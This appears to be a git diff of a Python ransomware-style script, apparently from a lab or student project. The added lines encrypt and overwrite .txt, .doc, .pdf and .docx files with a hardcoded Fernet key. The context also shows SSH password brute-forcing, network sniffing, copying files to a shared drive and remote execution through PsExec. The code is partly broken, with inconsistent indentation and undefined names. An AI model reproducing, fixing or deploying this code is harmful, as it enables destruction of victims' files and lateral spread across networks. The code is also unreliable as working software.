@@ -10,10 +10,39 @@ from pypsexec.client import Client #Sending remote commands
 #def encrypt file
 def ransom():
     key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
+    f = Fernet(key)
+    with open(filename, "rb") as file:
+    # read all file data
+        file_data = file.read()
+    # encrypt data
+    encrypting_data = f.encrypt(file_data)
+    #Write over the existing file
+    with open(filename, "wb") as file:
+        file.write(encrypting_data)
+
+#Walkthrough the Documents folder and the P: drive
+def fileWalk():
+    for (root, dirs, files) in os.walk(start_path, topdown = False):
+                for name in files:
+                    path = os.path.join(root, name)
+            if (path[-4:] == ".txt"):
+                try:
+                    encrypt_file(path, key)
+                except:
+                    pass
+            elif (path[-4:] == ".doc"):
+                encrypt_file(path, key)
+            if (path[-4:] == ".pdf"):
+                encrypt_file(path, key)
+            elif (path[-5:] == ".docx"):
+                encrypt_file(path, key)
 
 #play video
 def playVideo():
     os.system("cd C:\\Users\\IEUser\\Downloads")
+    #CHANGE BACKGROUD
+
+
 
 # sniff network 
 def sniffNetwork():
@@ -31,7 +60,6 @@ def bruteForce(user, ipAddress):
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh.connect(ipAddress, username="IEUser", password=secret)
             return secret
-
         except:
             time.sleep(1)
             print(secret)
@@ -39,6 +67,8 @@ def bruteForce(user, ipAddress):
 #Transfer
 def transferFile():
     os.system("robocopy C:\\Users\\IEUser\Downloads P:\\  ") #P:\\ zip folder
+    os.system("robocopy P:\\ C:\\Users\\IEUser\Downloads  ")#Fresh copy to start thr cycle again 
+
 
 #Remote execute file
 def remoteExecute(ipAddress, user, password):
